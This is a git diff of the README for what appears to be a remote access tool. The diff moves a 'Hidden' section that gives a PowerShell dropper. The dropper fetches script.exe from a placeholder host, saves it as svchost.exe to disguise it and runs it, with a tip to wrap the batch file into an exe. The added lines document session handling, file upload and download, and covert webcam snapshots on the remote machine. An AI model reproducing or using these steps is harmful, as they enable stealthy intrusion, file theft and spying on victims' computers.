@@ -73,31 +73,25 @@ author: HalukShan
  =========================================================
 ```
 
-### Hidden
-You can use the **powershell** 
-script to automate download the script and hide in some directorys, then execute
-````
-mkdir C:\tmp
-cd C:\tmp
-powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://youripordomain/script.exe','svchost.exe');
-svchost.exe
-````
-Save as .bat file, and use **battoexe** to generate a small exe file.
-
 ### Listening
 Choose option 1 to start the listening mode, enter your listening host
-and port, then wait the connection. When successfully connect to the cmd shell, you can use some command like
+and port, then wait the connection. When successfully connect to the cmd shell, you can 
+receive session, and type `session num` to open. Or check sessions 
+by `sessions`, type `help` to get help. when opening session, 
+use some command like
 
 Download the specified remote file and save as local filename 
 ```
-download remote_filename local_filename
+download <remote filename> <local_filename>
 ```
-
+Upload file
+```
+upload <local_filename> <remote filename>
+```
 Webcam snapshot and save as filename
 ```
 webcam_snap filename
 ```
-
 There are some common usages of cmdshell
 ```
 cd path
@@ -108,6 +102,16 @@ tasklist
 taskkill /PID pid /F
 netstat
 ```
+### Hidden
+You can use the **powershell** 
+script to automate download the script and hide in some directorys, then execute
+````
+mkdir C:\tmp
+cd C:\tmp
+powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://youripordomain/script.exe','svchost.exe');
+svchost.exe
+````
+Save as .bat file, and use **battoexe** to generate a small exe file.
 
 ## TroubleShoot
 If you got the below error message when generating
